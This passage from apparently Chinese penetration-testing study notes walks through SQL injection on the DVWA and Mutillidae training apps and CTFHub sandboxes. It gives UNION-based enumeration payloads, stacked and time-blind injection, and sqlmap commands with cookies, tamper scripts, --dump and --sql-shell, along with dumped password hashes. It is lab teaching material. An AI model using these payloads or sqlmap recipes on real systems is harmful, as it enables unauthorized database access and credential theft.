<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$getid</span> = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;&#x27; or 1=1 -- ddd &#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>输入的单引号与源码的单引号闭合，1=1永远为真，—是注释后面所有。1=1把所有元组显示出来：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">ID: &#x27; or 1=1 -- ddd</span><br><span class="line">First name: admin</span><br><span class="line">Surname: admin</span><br><span class="line"></span><br><span class="line">ID: &#x27; or 1=1 -- ddd</span><br><span class="line">First name: Gordon</span><br><span class="line">Surname: Brown</span><br><span class="line"></span><br><span class="line">ID: &#x27; or 1=1 -- ddd</span><br><span class="line">First name: Hack</span><br><span class="line">Surname: Me</span><br><span class="line"></span><br><span class="line">ID: &#x27; or 1=1 -- ddd</span><br><span class="line">First name: Pablo</span><br><span class="line">Surname: Picasso</span><br><span class="line"></span><br><span class="line">ID: &#x27; or 1=1 -- ddd</span><br><span class="line">First name: Bob</span><br><span class="line">Surname: Smith</span><br><span class="line"></span><br><span class="line">ID: &#x27; or 1=1 -- ddd</span><br><span class="line">First name: user</span><br><span class="line">Surname: user</span><br></pre></td></tr></table></figure>
<p>但这个只局限于这张表的first_name和last_name，再也查不出其它东西来，于是我们可以通过联合查询，查询其他列甚至其他表。</p>
<p>在不知道源码的情况下，输入单引号页面报错，说明有注入漏洞。我们可以输入union试字段<strong>‘ union select 1 — d</strong>，页面报错：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The used SELECT statements have a different number of columns</span><br></pre></td></tr></table></figure>
<p>试<strong>‘ union select 1,2 — d</strong>，没报错，说明字段是2</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ID: &#x27; union select 1,2 -- d</span><br><span class="line">First name: 1</span><br><span class="line">Surname: 2</span><br></pre></td></tr></table></figure>
<p>试<strong>‘ union select user(),database() — d</strong>，获得当前用户和当前数据库：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ID: &#x27; union select user(),database() -- d</span><br><span class="line">First name: dvwa@localhost</span><br><span class="line">Surname: dvwa</span><br></pre></td></tr></table></figure>
<p>试<strong>‘ union select table_schema,1 from information_schema.tables — dd</strong>，查询所有库名：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ID: &#x27; union select table_schema,1 from information_schema.tables -- dd</span><br><span class="line">First name: information_schema</span><br><span class="line">Surname: 1</span><br><span class="line"></span><br><span class="line">ID: &#x27; union select table_schema,1 from information_schema.tables -- dd</span><br><span class="line">First name: dvwa</span><br><span class="line">Surname: 1</span><br></pre></td></tr></table></figure>
<p>网页只显示了两个库，因为这个用户的权限只能看到这两个库。</p>
<p>试<strong>‘ union select table_schema,table_name from information_schema.tables where table_schema=’dvwa’ — dd</strong>，查询dvwa库的所有表：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ID: &#x27; union select table_schema,table_name from information_schema.tables where table_schema=&#x27;dvwa&#x27; -- dd</span><br><span class="line">First name: dvwa</span><br><span class="line">Surname: guestbook</span><br><span class="line"></span><br><span class="line">ID: &#x27; union select table_schema,table_name from information_schema.tables where table_schema=&#x27;dvwa&#x27; -- dd</span><br><span class="line">First name: dvwa</span><br><span class="line">Surname: users</span><br></pre></td></tr></table></figure>
<p>试<strong>‘ union select 1,column_name from information_schema.columns where table_name=’users’ — dd</strong>，查询users表中的列：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">ID: &#x27; union select 1,column_name from information_schema.columns where table_name=&#x27;users&#x27; -- dd</span><br><span class="line">First name: 1</span><br><span class="line">Surname: user_id</span><br><span class="line"></span><br><span class="line">ID: &#x27; union select 1,column_name from information_schema.columns where table_name=&#x27;users&#x27; -- dd</span><br><span class="line">First name: 1</span><br><span class="line">Surname: first_name</span><br><span class="line"></span><br><span class="line">ID: &#x27; union select 1,column_name from information_schema.columns where table_name=&#x27;users&#x27; -- dd</span><br><span class="line">First name: 1</span><br><span class="line">Surname: last_name</span><br><span class="line"></span><br><span class="line">ID: &#x27; union select 1,column_name from information_schema.columns where table_name=&#x27;users&#x27; -- dd</span><br><span class="line">First name: 1</span><br><span class="line">Surname: user</span><br><span class="line"></span><br><span class="line">ID: &#x27; union select 1,column_name from information_schema.columns where table_name=&#x27;users&#x27; -- dd</span><br><span class="line">First name: 1</span><br><span class="line">Surname: password</span><br><span class="line"></span><br><span class="line">ID: &#x27; union select 1,column_name from information_schema.columns where table_name=&#x27;users&#x27; -- dd</span><br><span class="line">First name: 1</span><br><span class="line">Surname: avatar</span><br></pre></td></tr></table></figure>
<p>知道表中的列名后，可以根据列查询对应列的数据，比如查询账号密码<strong>‘ union select user,password from users — dd</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">ID: &#x27; union select user,password from users -- dd</span><br><span class="line">First name: admin</span><br><span class="line">Surname: 21232f297a57a5a743894a0e4a801fc3</span><br><span class="line"></span><br><span class="line">ID: &#x27; union select user,password from users -- dd</span><br><span class="line">First name: gordonb</span><br><span class="line">Surname: e99a18c428cb38d5f260853678922e03</span><br><span class="line"></span><br><span class="line">ID: &#x27; union select user,password from users -- dd</span><br><span class="line">First name: 1337</span><br><span class="line">Surname: 8d3533d75ae2c3966d7e0d4fcc69216b</span><br><span class="line"></span><br><span class="line">ID: &#x27; union select user,password from users -- dd</span><br><span class="line">First name: pablo</span><br><span class="line">Surname: 0d107d09f5bbe40cade3de5c71e9e9b7</span><br><span class="line"></span><br><span class="line">ID: &#x27; union select user,password from users -- dd</span><br><span class="line">First name: smithy</span><br><span class="line">Surname: 5f4dcc3b5aa765d61d8327deb882cf99</span><br><span class="line"></span><br><span class="line">ID: &#x27; union select user,password from users -- dd</span><br><span class="line">First name: user</span><br><span class="line">Surname: ee11cbb19052e40b07aac0ca060c23ee</span><br></pre></td></tr></table></figure>
<p>密码是MD5加密的，只要找个MD5解密网页就可知道正确密码。</p>
<p>如果我们需要的信息有4列，但系统给的字段只有2列，我们可以用concat()函数实现字符串合并，<strong>‘ union select password,concat(first_name,’ ‘, last_name,’ ‘, user) from users — dd</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">ID: &#x27; union select password,concat(first_name,&#x27; &#x27;, last_name,&#x27; &#x27;, user) from users -- dd</span><br><span class="line">First name: 21232f297a57a5a743894a0e4a801fc3</span><br><span class="line">Surname: admin admin admin</span><br><span class="line"></span><br><span class="line">ID: &#x27; union select password,concat(first_name,&#x27; &#x27;, last_name,&#x27; &#x27;, user) from users -- dd</span><br><span class="line">First name: e99a18c428cb38d5f260853678922e03</span><br><span class="line">Surname: Gordon Brown gordonb</span><br><span class="line"></span><br><span class="line">ID: &#x27; union select password,concat(first_name,&#x27; &#x27;, last_name,&#x27; &#x27;, user) from users -- dd</span><br><span class="line">First name: 8d3533d75ae2c3966d7e0d4fcc69216b</span><br><span class="line">Surname: Hack Me 1337</span><br><span class="line"></span><br><span class="line">ID: &#x27; union select password,concat(first_name,&#x27; &#x27;, last_name,&#x27; &#x27;, user) from users -- dd</span><br><span class="line">First name: 0d107d09f5bbe40cade3de5c71e9e9b7</span><br><span class="line">Surname: Pablo Picasso pablo</span><br><span class="line"></span><br><span class="line">ID: &#x27; union select password,concat(first_name,&#x27; &#x27;, last_name,&#x27; &#x27;, user) from users -- dd</span><br><span class="line">First name: 5f4dcc3b5aa765d61d8327deb882cf99</span><br><span class="line">Surname: Bob Smith smithy</span><br><span class="line"></span><br><span class="line">ID: &#x27; union select password,concat(first_name,&#x27; &#x27;, last_name,&#x27; &#x27;, user) from users -- dd</span><br><span class="line">First name: ee11cbb19052e40b07aac0ca060c23ee</span><br><span class="line">Surname: user user user</span><br></pre></td></tr></table></figure>
<p>在函数被过滤的情况下，可以选择堆叠注入，如：<strong>0’;show databases;#</strong>，也可以用contact()连接</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;PREPARE hacker from concat(&#x27;s&#x27;,&#x27;elect&#x27;, &#x27; * from `1919810931114514` &#x27;);EXECUTE hacker;#</span><br></pre></td></tr></table></figure>
<h2 id="3-2-时间盲注"><a href="#3-2-时间盲注" class="headerlink" title="3.2 时间盲注"></a>3.2 时间盲注</h2><p>输入单引号没有反应，但不一定它没有注入漏洞。可以试一下<strong>3’ and sleep(5)#</strong>，给它一个真条件3，闭合，再停留5秒，发现网页会加载5秒，说明有注入点。</p>
<h3 id="3-2-1-SQL盲注-低"><a href="#3-2-1-SQL盲注-低" class="headerlink" title="3.2.1 SQL盲注[低]"></a>3.2.1 SQL盲注[低]</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">ID: 3&#x27; union select user,password from users -- dd</span><br><span class="line">First name: Hack</span><br><span class="line">Surname: Me</span><br><span class="line"></span><br><span class="line">ID: 3&#x27; union select user,password from users -- dd</span><br><span class="line">First name: admin</span><br><span class="line">Surname: 21232f297a57a5a743894a0e4a801fc3</span><br><span class="line"></span><br><span class="line">ID: 3&#x27; union select user,password from users -- dd</span><br><span class="line">First name: gordonb</span><br><span class="line">Surname: e99a18c428cb38d5f260853678922e03</span><br><span class="line"></span><br><span class="line">ID: 3&#x27; union select user,password from users -- dd</span><br><span class="line">First name: 1337</span><br><span class="line">Surname: 8d3533d75ae2c3966d7e0d4fcc69216b</span><br><span class="line"></span><br><span class="line">ID: 3&#x27; union select user,password from users -- dd</span><br><span class="line">First name: pablo</span><br><span class="line">Surname: 0d107d09f5bbe40cade3de5c71e9e9b7</span><br><span class="line"></span><br><span class="line">ID: 3&#x27; union select user,password from users -- dd</span><br><span class="line">First name: smithy</span><br><span class="line">Surname: 5f4dcc3b5aa765d61d8327deb882cf99</span><br><span class="line"></span><br><span class="line">ID: 3&#x27; union select user,password from users -- dd</span><br><span class="line">First name: user</span><br><span class="line">Surname: ee11cbb19052e40b07aac0ca060c23ee</span><br></pre></td></tr></table></figure>
<h2 id="3-3-堆叠注入"><a href="#3-3-堆叠注入" class="headerlink" title="3.3 堆叠注入"></a>3.3 堆叠注入</h2><p>在函数被过滤的情况下，可以选择堆叠注入，如：<strong>0’;show databases;#</strong>。也可以用contact()连接：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;PREPARE hacker from concat(&#x27;s&#x27;,&#x27;elect&#x27;, &#x27; * from `1919810931114514` &#x27;);EXECUTE hacker;#</span><br></pre></td></tr></table></figure>
<h2 id="3-4-自动化注入"><a href="#3-4-自动化注入" class="headerlink" title="3.4 自动化注入"></a>3.4 自动化注入</h2><p>kali中sqlmap一些用法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">-u URL, --url=URL   Target URL (e.g. &quot;http://www.site.com/vuln.php?id=1&quot;)</span><br><span class="line">--batch             Never ask for user input, use the default behavior</span><br><span class="line">-p TESTPARAMETER    Testable parameter(s)</span><br><span class="line">--dbms=DBMS         Force back-end DBMS to provided value</span><br><span class="line">--level=LEVEL       Level of tests to perform (1-5, default 1)</span><br><span class="line">--risk=RISK         Risk of tests to perform (1-3, default 1)</span><br><span class="line">--dbs				获取所有数据库</span><br><span class="line">--current-db		获取当前数据库</span><br><span class="line">--users				获取所有用户</span><br><span class="line">--current-user		获取当前用户</span><br><span class="line">-D databese_name --tables					获取database_name的所有表</span><br><span class="line">-D databese_name -T table_name --columns	获取database_name的table_name的所有列</span><br><span class="line">-D databese_name -T table_name -C column_name --dump	获取database_name的table_name的column_name的数据</span><br><span class="line">--cookie=COOKIE		添加cookie</span><br></pre></td></tr></table></figure>
<p>GET请求注入：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>challenge<span class="number">-9</span>a6148b6244df91d.sandbox.ctfhub.com:<span class="number">10800</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--batch --tables</span></span><br><span class="line"></span><br><span class="line">sqlmap <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>challenge<span class="number">-9</span>a6148b6244df91d.sandbox.ctfhub.com:<span class="number">10800</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--batch -D sqli -T flag --columns</span></span><br><span class="line"></span><br><span class="line">sqlmap <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>challenge<span class="number">-9</span>a6148b6244df91d.sandbox.ctfhub.com:<span class="number">10800</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--batch -D sqli -T flag -C flag --dump</span></span><br></pre></td></tr></table></figure>
<p>POST请求注入：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>challenge<span class="number">-9</span>a6148b6244df91d.sandbox.ctfhub.com:<span class="number">10800</span> <span class="comment">--batch --data=&quot;id=1&amp;pwd=333&quot;</span></span><br></pre></td></tr></table></figure>
<p>遇到过滤情况：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>challenge<span class="operator">-</span>b025f09fc3033f00.sandbox.ctfhub.com:<span class="number">10800</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--batch --tables --tamper &quot;space2comment.py&quot;</span></span><br></pre></td></tr></table></figure>
<p>脚本名：<code>space2comment.py</code> </p>
<p>作用：Replaces space character ‘ ‘ with comments  /**/。</p>
<p>也就是用注释/**/替换空格字符’ ‘。</p>
<p>sqlmap 中的 tamper 脚本有很多，例如：<code>equaltolike.py</code>（作用是用like代替等号）、<code>apostrophemask.py</code>（作用是用utf8代替引号）、 <code>greatest.py</code> （作用是绕过过滤’&gt;’ ，用GREATEST替换大于号）等。</p>
<h3 id="3-4-1-自动化注入-低"><a href="#3-4-1-自动化注入-低" class="headerlink" title="3.4.1 自动化注入(低)"></a>3.4.1 自动化注入(低)</h3><p>进入OWASP Mutillidae Ⅱ（不需要登录），选择左侧全部首一一栏，进入登录界面，随便输入错误的名字密码后，复制网页地址，用sqlmap查看网页是否有sql注入漏洞：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.137.146/mutillidae/index.php?page=user-info.php&amp;username=91&amp;password=%3Bohk&amp;user-info-php-submit-button=View+Account+Details&quot; -p username --batch		//只看username有无注入漏洞</span><br><span class="line"></span><br><span class="line">[14:30:48] [INFO] the back-end DBMS is MySQL</span><br><span class="line">web server operating system: Linux Ubuntu 10.04 (Lucid Lynx)</span><br><span class="line">web application technology: PHP 5.3.2, PHP, Apache 2.2.14</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.0		//数据库、系统、php等都出来了表示有注入漏洞</span><br><span class="line">[14:30:52] [INFO] fetched data logged to text files under &#x27;/root/.local/share/sqlmap/output/192.168.137.146&#x27;  </span><br><span class="line"></span><br><span class="line">//获得表中的数据</span><br><span class="line">sqlmap -u &quot;http://192.168.137.146/mutillidae/index.php?page=user-info.php&amp;username=91&amp;password=%3Bohk&amp;user-info-php-submit-button=View+Account+Details&quot; --batch -D nowasp -T accounts -C username,password --dump</span><br><span class="line"></span><br><span class="line">Database: nowasp</span><br><span class="line">Table: accounts</span><br><span class="line">[24 entries]</span><br><span class="line">+----------+--------------+</span><br><span class="line">| username | password     |</span><br><span class="line">+----------+--------------+</span><br><span class="line">| admin    | admin        |</span><br><span class="line">| adrian   | somepassword |</span><br><span class="line">| john     | monkey       |</span><br><span class="line">| jeremy   | password     |</span><br><span class="line">| bryce    | password     |</span><br><span class="line">| samurai  | samurai      |</span><br><span class="line">| jim      | password     |</span><br><span class="line">| bobby    | password     |</span><br><span class="line">| simba    | password     |</span><br><span class="line">| dreveil  | password     |</span><br><span class="line">| scotty   | password     |</span><br><span class="line">| cal      | password     |</span><br><span class="line">| john     | password     |</span><br><span class="line">| kevin    | 42           |</span><br><span class="line">| dave     | set          |</span><br><span class="line">| patches  | tortoise     |</span><br><span class="line">| rocky    | stripes      |</span><br><span class="line">| tim      | lanmaster53  |</span><br><span class="line">| ABaker   | SoSecret     |</span><br><span class="line">| PPan     | NotTelling   |</span><br><span class="line">| CHook    | JollyRoger   |</span><br><span class="line">| james    | i&lt;3devs      |</span><br><span class="line">| user     | user         |</span><br><span class="line">| ed       | pentest      |</span><br><span class="line">+----------+--------------+</span><br></pre></td></tr></table></figure>
<p>如果SQL注入点没有经过登录就可找到，可以直接按照上述方法注入；如果需要登录，肯定不能通过提交方式去登录，因为你也不知道账号密码，所以要通过找cookie（cookie是前端，session是后端）去登录。这也是<strong>SQL注入[中、高]，SQL盲注[中、高]</strong>的解决办法。</p>
<p>回到DVWA（需要登录）的SQL注入，随便输入一个错误数字，用火狐插件cookie监视器将这个网址的所有cookie复制下来（复制下来的是冒号，要改成等号），或者可以通过burpsuite抓包拿到cookie，再跑，结果成功渗透。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.137.146/dvwa/vulnerabilities/sqli/?id=99&amp;Submit=Submit#&quot; --batch --cookie=&quot;PHPSESSID=9nfdguaho24opqkkqca6ma4ji0;security=low;acopendivids=swingset,jotto,phpbb2,redmine;acgroupswithpersist=nada&quot; -p id</span><br><span class="line"></span><br><span class="line">[16:25:54] [INFO] the back-end DBMS is MySQL</span><br><span class="line">web server operating system: Linux Ubuntu 10.04 (Lucid Lynx)</span><br><span class="line">web application technology: PHP 5.3.2, Apache 2.2.14</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.0</span><br><span class="line">[16:25:54] [INFO] fetched data logged to text files under &#x27;/root/.local/share/sqlmap/output/192.168.137.146&#x27;   </span><br><span class="line"></span><br><span class="line">//先找数据库</span><br><span class="line">sqlmap -u &quot;http://192.168.137.146/dvwa/vulnerabilities/sqli/?id=99&amp;Submit=Submit#&quot; --batch --cookie=&quot;PHPSESSID=9nfdguaho24opqkkqca6ma4ji0;security=low;acopendivids=swingset,jotto,phpbb2,redmine;acgroupswithpersist=nada&quot; --dbs</span><br><span class="line"></span><br><span class="line">available databases [2]:</span><br><span class="line">[*] dvwa</span><br><span class="line">[*] information_schema</span><br><span class="line"></span><br><span class="line">//再找表</span><br><span class="line">sqlmap -u &quot;http://192.168.137.146/dvwa/vulnerabilities/sqli/?id=99&amp;Submit=Submit#&quot; --batch --cookie=&quot;PHPSESSID=9nfdguaho24opqkkqca6ma4ji0;security=low;acopendivids=swingset,jotto,phpbb2,redmine;acgroupswithpersist=nada&quot; -D dvwa --tables</span><br><span class="line"></span><br><span class="line">Database: dvwa</span><br><span class="line">[2 tables]</span><br><span class="line">+-----------+</span><br><span class="line">| guestbook |</span><br><span class="line">| users     |</span><br><span class="line">+-----------+</span><br><span class="line"></span><br><span class="line">//再找列</span><br><span class="line">sqlmap -u &quot;http://192.168.137.146/dvwa/vulnerabilities/sqli/?id=99&amp;Submit=Submit#&quot; --batch --cookie=&quot;PHPSESSID=9nfdguaho24opqkkqca6ma4ji0;security=low;acopendivids=swingset,jotto,phpbb2,redmine;acgroupswithpersist=nada&quot; -D dvwa -T users --columns</span><br><span class="line"></span><br><span class="line">Database: dvwa</span><br><span class="line">Table: users</span><br><span class="line">[6 columns]</span><br><span class="line">+------------+-------------+</span><br><span class="line">| Column     | Type        |</span><br><span class="line">+------------+-------------+</span><br><span class="line">| user       | varchar(15) |</span><br><span class="line">| avatar     | varchar(70) |</span><br><span class="line">| first_name | varchar(15) |</span><br><span class="line">| last_name  | varchar(15) |</span><br><span class="line">| password   | varchar(32) |</span><br><span class="line">| user_id    | int(6)      |</span><br><span class="line">+------------+-------------+</span><br><span class="line"></span><br><span class="line">//再找表中数据</span><br><span class="line">sqlmap -u &quot;http://192.168.137.146/dvwa/vulnerabilities/sqli/?id=99&amp;Submit=Submit#&quot; --batch --cookie=&quot;PHPSESSID=9nfdguaho24opqkkqca6ma4ji0;security=low;acopendivids=swingset,jotto,phpbb2,redmine;acgroupswithpersist=nada&quot; -D dvwa -T users -C user,password --dump</span><br><span class="line"></span><br><span class="line">Database: dvwa                                                    </span><br><span class="line">Table: users</span><br><span class="line">[6 entries]</span><br><span class="line">+---------+---------------------------------------------+</span><br><span class="line">| user    | password                                    |</span><br><span class="line">+---------+---------------------------------------------+</span><br><span class="line">| admin   | 21232f297a57a5a743894a0e4a801fc3 (admin)    |</span><br><span class="line">| gordonb | e99a18c428cb38d5f260853678922e03 (abc123)   |</span><br><span class="line">| 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  |</span><br><span class="line">| pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  |</span><br><span class="line">| smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |</span><br><span class="line">| user    | ee11cbb19052e40b07aac0ca060c23ee (user)     |</span><br><span class="line">+---------+---------------------------------------------+</span><br></pre></td></tr></table></figure>
<p>提权操作，与数据库交互：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.137.146/dvwa/vulnerabilities/sqli/?id=99&amp;Submit=Submit#&quot; --batch --cookie=&quot;PHPSESSID=9nfdguaho24opqkkqca6ma4ji0;security=low;acopendivids=swingset,jotto,phpbb2,redmine;acgroupswithpersist=nada&quot; --sql-shell</span><br><span class="line"></span><br><span class="line">sql-shell&gt; select user,password from users;</span><br><span class="line">[16:44:30] [INFO] fetching SQL SELECT statement query output: &#x27;select user,password from users&#x27;                                       </span><br><span class="line">[16:44:30] [CRITICAL] connection dropped or unknown HTTP status code received. Try to force the HTTP User-Agent header with option &#x27;--user-agent&#x27; or switch &#x27;--random-agent&#x27;. sqlmap is going to retry the request(s)</span><br><span class="line">select user,password from users [6]:</span><br><span class="line">[*] admin, 21232f297a57a5a743894a0e4a801fc3</span><br><span class="line">[*] gordonb, e99a18c428cb38d5f260853678922e03</span><br><span class="line">[*] 1337, 8d3533d75ae2c3966d7e0d4fcc69216b</span><br><span class="line">[*] pablo, 0d107d09f5bbe40cade3de5c71e9e9b7</span><br><span class="line">[*] smithy, 5f4dcc3b5aa765d61d8327deb882cf99</span><br><span class="line">[*] user, ee11cbb19052e40b07aac0ca060c23ee</span><br></pre></td></tr></table></figure>
<h1 id="4-XSS"><a href="#4-XSS" class="headerlink" title="4. XSS"></a>4. XSS</h1><p>Cross Site Scripting</p>
<p>经常遭受跨站脚本攻击的典型应用有：邮件、论坛、即时通信、留言板、社交平台等。</p>
<h2 id="4-1-XSS跨站脚本攻击"><a href="#4-1-XSS跨站脚本攻击" class="headerlink" title="4.1 XSS跨站脚本攻击"></a>4.1 XSS跨站脚本攻击</h2><p>XSS是对客户端进行攻击。</p>
<p><strong>常用的HTML标签</strong></p>
